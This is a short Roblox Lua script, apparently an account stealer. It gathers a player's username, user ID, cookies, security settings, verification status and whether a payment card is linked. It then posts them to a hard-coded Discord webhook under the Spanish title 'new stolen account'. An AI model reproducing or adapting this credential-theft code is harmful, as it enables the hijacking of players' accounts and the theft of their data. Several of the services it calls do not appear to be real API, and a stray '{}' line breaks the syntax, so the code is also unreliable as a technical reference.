local http = game:GetService("HttpService")
local webhook = "https://discord.com/api/webhooks/1379585399042871386/Vr8SbuI4jCnJBCZcX8Y6L6XEjbjzf0Yk-FIsXdiwMVcZ8FoOUHSwM4ZRF9nweAetHNlc"

local function getAccountInfo()
    local accountInfo = {}
{}
    accountInfo.username = game.Players.LocalPlayer.Name
    accountInfo.userId = game.Players.LocalPlayer.UserId
    accountInfo.cookies = game:GetService("CookiesService"):GetCookies()
    accountInfo.securityMethod = game:GetService("SecurityService"):GetSecurityMethod()
    accountInfo.emailVerified = game:GetService("EmailService"):IsEmailVerified()
    accountInfo.ageVerified = game:GetService("AgeVerificationService"):IsAgeVerified()
    accountInfo.cardAssociated = game:GetService("PaymentService"):HasCardAssociated()
    return accountInfo
end

local function sendToWebhook(data)
    local payload = http:JSONEncode({
        embeds = {{
            title = "Nueva cuenta robada",
            description = "Información de la cuenta robada",
            color = 16711680,
            fields = {
                {name = "Usuario", value = data.username, inline = true},
                {name = "ID de usuario", value = data.userId, inline = true},
                {name = "Cookies", value = data.cookies, inline = true},
                {name = "Método de seguridad", value = data.securityMethod, inline = true},
                {name = "Correo verificado", value = data.emailVerified and "Sí" or "No", inline = true},
                {name = "Edad verificada", value = data.ageVerified and "Sí" or "No", inline = true},
                {name = "Tarjeta asociada", value = data.cardAssociated and "Sí" or "No", inline = true},
            }
        }}
    })
    http:PostAsync(webhook, payload, Enum.HttpContentType.ApplicationJson)
end

local accountInfo = getAccountInfo()
sendToWebhook(accountInfo)
